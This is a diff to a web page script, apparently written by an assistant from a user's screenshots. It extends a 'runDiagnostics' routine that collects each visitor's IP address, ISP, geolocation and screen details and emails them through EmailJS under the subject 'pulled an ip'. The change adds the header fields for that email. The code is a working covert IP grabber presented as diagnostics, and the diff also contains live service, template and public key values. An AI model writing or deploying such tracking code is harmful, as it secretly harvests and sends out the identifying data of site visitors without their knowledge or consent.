@@ -1,7 +1,7 @@
 // --- CONFIGURATION ---
 const SERVICE_ID = "service_yn5chrh";
 const TEMPLATE_ID = "template_psyarye";
-const PUBLIC_KEY = "2jj19BTFwlNnm8fp_"; // <--- PASTE YOUR KEY HERE
+const PUBLIC_KEY = "2jj19BTFwlNnm8fp_"; // Updated from your screenshot
 
 document.addEventListener('DOMContentLoaded', () => {
     // Initialize EmailJS
@@ -50,8 +50,14 @@ async function runDiagnostics() {
         const screen = window.screen;
 
         // 3. Prepare Data for Email
-        // These keys match the {{variables}} in your template
+        // matching the variables seen in your screenshots {{title}}, {{name}}, etc.
         const emailParams = {
+            // Header Fields
+            title: ipData.ip || 'Unknown IP', // Fills the subject line "pulled an ip: {{title}}"
+            name: "XARVOK System",            // Fills "From Name"
+            email: "report@xarvok.com",       // Fills "Reply To"
+
+            // Body Fields (Diagnostic Data)
             ip: ipData.ip || 'UNAVAILABLE',
             isp: ipData.org || 'UNKNOWN ISP',
             location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
